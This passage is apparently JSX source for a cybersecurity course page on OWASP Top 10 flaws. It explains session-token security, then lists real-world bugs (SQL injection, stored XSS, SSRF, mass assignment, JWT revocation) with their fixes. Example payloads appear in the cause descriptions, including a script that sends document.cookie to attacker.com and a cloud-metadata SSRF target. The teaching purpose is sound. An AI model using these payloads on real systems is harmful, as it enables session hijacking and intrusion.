        Authentication failures mean the process of verifying identity is broken — weak passwords are accepted, brute force is not rate-limited, credential stuffing is not detected, or the authentication logic has a bypass (SQL injection in the login query). Authentication failure = attacker impersonates a user before any session exists.
        {'\n\n'}
        Session management failures occur after authentication. Once authentication succeeds, the server creates a session and gives the user a session token (typically a cookie). From that point, every subsequent request is authenticated by presenting this token — the server does not re-authenticate the user's password on every request. Session management failures: predictable session tokens (an attacker can guess valid tokens), tokens that are never invalidated on logout (an old stolen token remains valid), tokens with excessive lifetime (a token from three years ago still works), or tokens transmitted over HTTP (captured by a network observer).
        {'\n\n'}
        Session token security requirements: tokens must be cryptographically random with at least 128 bits of entropy (os.urandom(16) or secrets.token_hex(32) in Python). Tokens must be invalidated server-side when the user logs out (not just deleted from the client cookie — the server must remove the session record so the token cannot be reused even if an attacker has a copy). Tokens should expire (server-side) after a defined period of inactivity. Tokens must be transmitted only over HTTPS with the Secure flag set on the cookie, and should be HttpOnly (not accessible to JavaScript) to prevent XSS theft.
        {'\n\n'}
        Why both matter: an authentication failure gives an attacker access as long as the authentication channel exists. A session management failure may give an attacker persistent access even after the user changes their password, because the old session token (which they stole) remains valid on the server until it expires or is explicitly invalidated.
      </IQ>

      <HR />

      {/* ── Error Library ── */}
      <Part n="15" title="OWASP Vulnerabilities Found in Real Code Reviews" />

      <Err
        msg="SQL injection in search: GET /search?q=' OR '1'='1 returns all records"
        cause={'The search endpoint builds a query with string concatenation: query = f\'SELECT * FROM products WHERE name LIKE "%{search_term}%"\'. The search_term comes directly from the URL parameter without sanitisation. An attacker who enters a single quote or SQL keywords can break out of the string context and inject arbitrary SQL. With UNION injection they can extract data from other tables; with stacked queries they can modify data.'}
        fix="Use parameterised queries: cursor.execute('SELECT * FROM products WHERE name LIKE %s', ('%' + search_term + '%',)). The LIKE pattern is built server-side and passed as a parameter — the database treats it as a literal string, not as SQL syntax. Also consider using full-text search functionality in the database rather than LIKE queries for performance. Add WAF rules for SQLi patterns as an additional defence layer."
      />

      <Err
        msg="XSS in profile name: stored script executes for every user who views the profile"
        cause="The application stores user-supplied profile names in the database and renders them directly into HTML: &lt;h1&gt;{'{user.display_name}'}&lt;/h1&gt; using PHP string interpolation or template without encoding. A user sets their name to &lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;. Every visitor to that profile page now sends their session cookie to the attacker. This is stored XSS — the payload is served by the legitimate site to every visitor indefinitely."
        fix="HTML-encode all dynamic content before rendering: use htmlspecialchars() in PHP, escape() in Python/Jinja2, or the framework's built-in template encoding. Modern frameworks (React, Vue, Angular) HTML-encode by default when using {'{variable}'} syntax — never bypass this with dangerouslySetInnerHTML or equivalent. Add a Content Security Policy header to restrict script execution as a defence-in-depth layer."
      />

      <Err
        msg="SSRF via webhook URL: internal admin panel accessible through server-side fetch"
        cause="A webhook configuration feature allows users to specify a URL for the server to send notifications to. The server fetches the URL to verify it is reachable. An attacker sets the webhook URL to http://localhost/admin — the server fetches its own admin panel (which is only accessible from localhost) and returns the response to the attacker. The attacker can also target http://169.254.169.254/latest/meta-data/ in cloud environments."
        fix="Validate webhook URLs against a strict allowlist: only HTTPS URLs with public IP addresses and resolvable public domain names. Explicitly block loopback addresses (127.x.x.x), link-local addresses (169.254.x.x), private RFC 1918 ranges (10.x, 172.16-31.x, 192.168.x), and IPv6 equivalents. Resolve the hostname and check the resolved IP against the blocklist before making the request (DNS rebinding mitigation). Consider using an outbound proxy that enforces these rules at the network layer rather than in application code."
      />

      <Err
        msg="Mass assignment: POST /api/users allows setting isAdmin=true"
        cause={'A REST API endpoint accepts JSON to update a user profile: POST /api/users/me with {"name": "Alice", "email": "alice@example.com"}. The code uses a framework\'s mass assignment feature: user.update_from_dict(request.json). If the User model has an is_admin field, and the attacker includes {"name": "Alice", "is_admin": true}, the mass assignment updates is_admin too. The attacker has escalated to admin without any other vulnerability.'}
        fix="Explicit field allowlisting for mass assignment: only update fields that are explicitly permitted for user update. In Rails: strong parameters (permit :name, :email). In Django: explicitly list updatable fields. Never use update_from_dict or equivalent that accepts arbitrary fields from user input. Alternatively, use separate serializers/DTOs for user-facing input vs internal model fields."
      />

      <Err
        msg="Broken session invalidation: JWT tokens valid indefinitely after logout"
        cause="The application uses JWTs (JSON Web Tokens) with a 24-hour expiration. When a user logs out, the token is deleted from the client (cookie cleared), but the server has no record of which tokens are invalidated — it only validates the signature and expiry. An attacker who captures the JWT (via XSS, network interception, or log exposure) can continue using it for up to 24 hours after the user logged out and changed their password. Password changes do not invalidate existing tokens."
        fix="Maintain a server-side token revocation list (or use short-lived tokens with refresh token rotation). On logout: add the JWT jti (token ID) to a revocation set (Redis set with TTL equal to token expiry). On every request: check if the jti is in the revocation set before accepting the token. On password change: revoke all existing tokens for the user. Alternatively, reduce JWT expiry to 15 minutes and use refresh tokens — a stolen token is useless after 15 minutes."
      />

      {/* ── Key Takeaways ── */}
      <KeyTakeaways items={[
        'The OWASP Top 10 represents the most critical and common web application vulnerability classes — not an exhaustive list of all vulnerabilities. Understanding these from first principles (why the vulnerability exists, not just what it is called) enables recognition in real code.',
        'Broken Access Control (A01) is the most common vulnerability — present in 94% of tested applications. IDOR is the most common pattern: a user-controlled ID used to access a resource without verifying the requesting user owns it. The fix is always a server-side authorisation check on every resource access.',
        'SQL Injection (A03) occurs when user input is concatenated into SQL queries rather than passed as parameters. The fix is parameterised queries everywhere, with zero exceptions. ORMs protect by default when used correctly; raw string formatting SQL is always vulnerable.',
        'XSS (not a separate OWASP 2021 category but still critical) injects JavaScript into web pages. Reflected XSS requires user interaction with a malicious link. Stored XSS is served by the legitimate site to all visitors. DOM-based XSS is a client-side JavaScript vulnerability. Output encoding and Content Security Policy are the primary mitigations.',
        'SSRF (A10) allows attackers to force the server to make HTTP requests to arbitrary URLs, reaching internal services and cloud metadata endpoints. The Capital One breach exploited SSRF to access AWS IAM credentials. Prevention requires URL allowlisting and blocking private IP ranges at request time.',
        'Cryptographic failures (A02) include: plaintext transmission (HTTP instead of HTTPS), weak password hashing (MD5, SHA-1, SHA-256 — too fast), and deprecated algorithms (DES, ECB mode). Use AES-256-GCM for encryption, Argon2id for password hashing, and TLS 1.2+ everywhere.',
        'Vulnerable dependencies (A06) can compromise the application through no fault of the application code. Log4Shell (CVE-2021-44228) demonstrated how a single dependency vulnerability can expose millions of applications instantly. Dependency scanning in CI/CD pipelines (Dependabot, Snyk, pip-audit) is required hygiene.',
        'Security logging and monitoring failures (A09) enable long attacker dwell times — the average 204 days between breach and detection is primarily a logging failure. Log authentication events, authorisation failures, and sensitive data access. Never log passwords, tokens, or sensitive field values.',
        'Session management security: session tokens must be cryptographically random (128+ bits of entropy), server-side invalidated on logout, expired after inactivity, transmitted only over HTTPS, and HttpOnly. JWTs without server-side revocation cannot be invalidated — design accordingly.',
        'The AppSec mindset for code review: at every resource access, ask "does the server verify that this authenticated user is authorised to access this specific resource?" At every SQL query, ask "is user input parameterised?" At every HTML render, ask "is dynamic content encoded?" These three questions catch the majority of OWASP Top 10 vulnerabilities.',
      ]} />

      {/* ── Next Module CTA ── */}
      <div style={{ background: 'var(--surface)', border: '1px solid var(--border)', borderRadius: 10, padding: '24px', marginTop: 40 }}>
        <p style={{ fontSize: 10, color: 'var(--muted)', letterSpacing: '.12em', textTransform: 'uppercase', fontFamily: 'var(--font-mono)', fontWeight: 700, margin: '0 0 10px' }}>
          What comes next
        </p>
        <p style={{ fontSize: 15, color: 'var(--text)', lineHeight: 1.85, margin: '0 0 20px' }}>
          In <strong>Module 10</strong>, you go to the network layer — how MITM attacks intercept traffic, how ARP poisoning works at the wire level, how DNS hijacking redirects connections, and the tools that perform and detect these attacks.
        </p>
        <Link href="/learn/cybersecurity/network-attacks" style={{ background: C, color: '#fff', padding: '11px 24px', borderRadius: 7, fontWeight: 700, fontSize: 13, textDecoration: 'none', display: 'inline-block' }}>
          Module 10 → Network Attacks — MITM, Sniffing, ARP Poisoning, DNS Hijacking
        </Link>
      </div>

    </LearnLayout>
  )
}
